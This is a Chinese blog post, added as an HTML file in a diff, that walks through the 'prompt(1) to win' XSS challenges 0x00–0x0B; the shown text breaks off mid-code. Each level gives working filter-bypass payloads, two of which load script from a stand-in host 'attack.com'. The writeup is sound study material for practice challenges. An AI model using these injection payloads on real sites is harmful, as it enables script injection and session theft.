@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,XSS,security" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="prompt(1) to win XSS在线练习题，每一道都非常有趣，题目都有典型性。官方wiki题解在这里 0x0012345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; va">
+<meta name="keywords" content="CTF,writeup,XSS,security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="prompt(1)-writeup">
+<meta property="og:url" content="http://yoursite.com/blog/prompt-1-writeup/index.html">
+<meta property="og:site_name" content="empty_xl Blog">
+<meta property="og:description" content="prompt(1) to win XSS在线练习题，每一道都非常有趣，题目都有典型性。官方wiki题解在这里 0x0012345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; va">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-10-01T14:16:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="prompt(1)-writeup">
+<meta name="twitter:description" content="prompt(1) to win XSS在线练习题，每一道都非常有趣，题目都有典型性。官方wiki题解在这里 0x0012345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; va">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QT63IJTEZX',
+      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
+      indexName: 'emptyxl.github.io',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/blog/prompt-1-writeup/"/>
+
+
+
+
+
+  <title>prompt(1)-writeup | empty_xl Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-90390918-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">empty_xl Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Hello World！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/prompt-1-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="empty_xl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="empty_xl Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">prompt(1)-writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T10:19:18+08:00">
+                2017-09-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-01T22:16:42+08:00">
+                2017-10-01
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="http://prompt.ml" target="_blank" rel="external">prompt(1) to win</a> XSS在线练习题，每一道都非常有趣，题目都有典型性。<a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">官方wiki题解在这里</a></p>
+<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// warm up</span></div><div class="line">    <span class="comment">// script should be executed without user interaction</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>简单双引号闭合，为了使答案最短，可以用<code>svg</code>标签:<br><code>&quot;&gt;&lt;svg/onload=prompt(1)&gt;</code></p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></div><div class="line">    <span class="comment">// Ext.util.Format.stripTags</span></div><div class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</div><div class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>规则会将<code>&lt;/xx&gt;</code>过滤，可以通过不使用<code>&gt;</code>来绕过规则，跟上题一样，可以使用<code>svg</code>标签，这里需要注意的知识点是：为了让<code>onload</code>立即渲染执行，可以通过在后面加上分隔符（<code>空格</code>或<code>回车</code>）来执行，所以最终答案为:<br><code>&lt;svg/onload=prompt(1)</code>注意末尾要加<code>`或者</code>\n`  </p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">//                      v-- frowny face</span></div><div class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></div><div class="line">    <span class="keyword">return</span> input;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>规则过滤了 <code>=</code> <code>(</code> 由于我们使用<code>HTML实体</code>在<code>&lt;svg&gt;</code>的<code>&lt;script&gt;</code>中，或者其他<code>CDATA元素</code>中是会被解析成文本的，所以可以使用<code>HTML实体</code>，绕过<code>(</code>检测，所以最终结果如下:<br><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code></p>
+<a id="more"></a>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// filter potential comment end delimiters</span></div><div class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</div><div class="line"></div><div class="line">    <span class="comment">// comment the input to avoid script execution</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看见输出被注释<code>&lt;!-- --&gt;</code>包裹，需要闭合注释进行执行，而代码又会过滤<code>-&gt;</code>，所以需要知道一些特殊的点:</p>
+<blockquote>
+<p>“… the comment must be ended by the three character sequence U+002D HYPHEN-MINUS, U+002D HYPHEN-MINUS, U+003E GREATER-THAN SIGN (–&gt;).”  </p>
+</blockquote>
+<p>在HTML说明中规定注释的结尾必须以<code>--&gt;</code>为结尾，而在<code>HTML5</code>中有些不一样，除了<code>--&gt;</code>之外，<strong><code>--!&gt;</code>也可以闭合!</strong><br>答案：<code>--!&gt;&lt;svg/onload=prompt(1)</code></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// make sure the script belongs to own site</span></div><div class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></div><div class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</div><div class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">        script.src = input;</div><div class="line">        <span class="keyword">return</span> script.outerHTML;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这道题题目限制在<code>prompt.ml/</code>域名下去加载资源，所以是想办法绕过检测机制去加载我们恶意网站的内容，这里需要知道一个知识：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">URL的完整格式</div><div class="line">协议类型:[<span class="string">//[访问资源需要的凭证信息@</span>]服务器地址[<span class="string">:端口号</span>]][<span class="string">/资源层级UNIX文件路径</span>]文件名[<span class="string">?查询</span>][<span class="symbol">#片段ID</span>]</div></pre></td></tr></table></figure>
+<p>即在url中还有一个<code>访问凭证</code>字段，我们的想法是通过<code>@</code>符号，使浏览器让<code>prompt.ml</code>等内容被识别为凭证信息，从而访问我们的恶意网站，由于使用了<code>decodeURIComponent</code>函数，可以通过使用<code>URLencode</code>进行转义，被decode之后的内容还满足正则表达式，但<code>input</code>本身的<code>%2f</code>会被识别为凭证信息，所以答案应该是:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//prompt.ml%2f@attack.com</span></div></pre></td></tr></table></figure>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// apply strict filter rules of level 0</span></div><div class="line">    <span class="comment">// filter "&gt;" and event handlers</span></div><div class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>题目过滤了<code>&gt;</code>和所有事件,有一点需要明确，其正则表达式没有使用多行匹配模式，这一点可以被很多时候利用，还有一点是由于我们所处的位置在<code>type=text</code>之前，所以可以使用<code>type=img</code>将其类型改为image，可以想想<code>type=hidden</code>,然后通过换行绕过正则表达式，答案为：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">"type=image src=# onerror</span></div><div class="line">=<span class="string">"prompt(1)</span></div></pre></td></tr></table></figure>
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// let's do a post redirection</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// pass in formURL#formDataJSON</span></div><div class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></div><div class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</div><div class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</div><div class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</div><div class="line">        form.action = formURL;</div><div class="line">        form.method = <span class="string">'post'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</div><div class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</div><div class="line">            input.name = i;</div><div class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></div><div class="line">&lt;script&gt;                                                  \n\</div><div class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</div><div class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</div><div class="line">        document.forms[0].submit();                       \n\</div><div class="line">    else                                                  \n\</div><div class="line">        document.write("Action forbidden.")               \n\</div><div class="line">&lt;/script&gt;                                                 \n\</div><div class="line">        ';</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>常见方式，使用自己定义的同名属性来代替默认字段内容，这样首先会加载我们新创建的字段内容，答案如下：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">javascript:</span>prompt(<span class="number">1</span>)<span class="meta">#&#123;<span class="string">"action"</span>:1&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></div><div class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</div><div class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</div><div class="line">        <span class="comment">// title can only contain 12 characters</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</div><div class="line">    &#125;).join(<span class="string">'\n'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>由题目得通过<code>#</code>进行分割输出且限制长度为12个字符，比较常见方法通过<code>/**/</code>注释来进行构造，答案如下:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"&gt;&lt;svg/a=#"</span>onload='<span class="comment">/*#*/</span>prompt(<span class="number">1</span>)'</div></pre></td></tr></table></figure></p>
+<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// prevent input from getting out of comment</span></div><div class="line">    <span class="comment">// strip off line-breaks and stuff</span></div><div class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></div><div class="line">&lt;script&gt;                                    \n\</div><div class="line">    // console.log("' + input + <span class="string">'");        \n\</span></div><div class="line">&lt;/script&gt; ';</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>需要知道一个知识点：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Javascript中valid line separators除了<span class="string">\r</span> <span class="string">\n</span> </div><div class="line">还有:</div><div class="line"><span class="string">\u2028(Line</span> Separator)</div><div class="line"><span class="string">\u2029(Paragraph</span> Separator)</div></pre></td></tr></table></figure>
+<p>所以答案为：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">test</span><span class="selector-attr">[\u2028]</span><span class="selector-tag">prompt</span>(<span class="number">1</span>)<span class="selector-attr">[\u2028]</span><span class="selector-tag">--</span>&gt;</div></pre></td></tr></table></figure>
+<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// filter potential start-tags</span></div><div class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</div><div class="line">    <span class="comment">// use all-caps for heading</span></div><div class="line">    input = input.toUpperCase();</div><div class="line"></div><div class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这道题比较有意思，过滤了标签的开始，并将内容全部大写了，这里需要知道，unicode码包含了许多国家的语言文字，有一些语言的字母调用<code>Upper函数</code>进行大写，由于没有对应的大写文字，会自动的转换为英文字母，而<strong>在url中，协议和域名是不区分大小写的</strong>这时，我们就可以进行利用了。<br>首先，我们可以在控制台写一个循环来查找Upper之后是<code>S</code>的字符。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="number">100000</span>;i++)&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">String</span>.fromCharCode(i).toUpperCase()==<span class="string">"S"</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(i)</div><div class="line">        <span class="built_in">console</span>.log(<span class="built_in">String</span>.fromCharCode(i))</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后用这个字符<code>ſ</code>进行绕过。结果如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ſvg</span>&gt;</span><span class="tag">&lt;<span class="name">ſcript</span>/<span class="attr">href</span>=<span class="string">attack.com</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</div><div class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></div><div class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</div><div class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></div><div class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这种过滤多次一般会存在后者刚好帮前者达成了目的，比较简单：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p'rompt(<span class="number">1</span>)</div></pre></td></tr></table></figure>
+<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></div><div class="line">    <span class="comment">// name should not contain special characters</span></div><div class="line">    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, <span class="string">''</span>);</div><div class="line"></div><div class="line">    <span class="comment">// data to be parsed as JSON</span></div><div class="line">    var dataString = <span class="string">'&#123;"</span>action<span class="string">":"</span>login<span class="string">","</span>message<span class="string">":"</span>Welcome back, <span class="string">' + memberName + '</span>.<span class="string">"&#125;'</span>;</div><div class="line"></div><div class="line">    <span class="comment">// directly "parse" data in script context</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></div><div class="line">&lt;script&gt;                                    \n\</div><div class="line">    var data = ' + dataString + <span class="string">';          \n\</span></div><div class="line">    if (data.action === "login<span class="string">")            \n\</span></div><div class="line">        document.write(data.message)        \n\</div><div class="line">&lt;/script&gt; ';</div><div 